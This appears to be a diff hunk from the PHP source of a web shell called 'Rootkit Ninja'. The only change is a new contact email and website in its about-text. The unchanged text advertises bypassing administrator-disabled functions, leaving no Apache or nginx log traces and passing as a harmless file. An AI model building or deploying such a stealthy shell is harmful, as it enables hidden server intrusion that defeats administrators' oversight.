@@ -2063,7 +2063,7 @@ if($s_auth){
         <p>Rootkit Ninja - One of a red team consists of security professionals who act as adversaries to overcome cyber security controls.</p>
         <p>We created this program for testing purposes only, that we can bypass all functions that have been disabled by the system administrator, there are no log traces on apache and nginx, and detected as harmless files by the system.</p>
 		<p>Usage of program without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.</p>
-        <p>e: <a href='mailto:support@rootkit.ninja'>support@rootkit.ninja</a> | w: <a href='https://www.rootkit.ninja'>www.rootkit.ninja</a></p>
+        <p>e: <a href='mailto:hello@rootkit-ninja.com'>hello@rootkit-ninja.com</a> | w: <a href='https://www.rootkit-ninja.com'>www.rootkit-ninja.com</a></p>
         </div>";
 	}
 
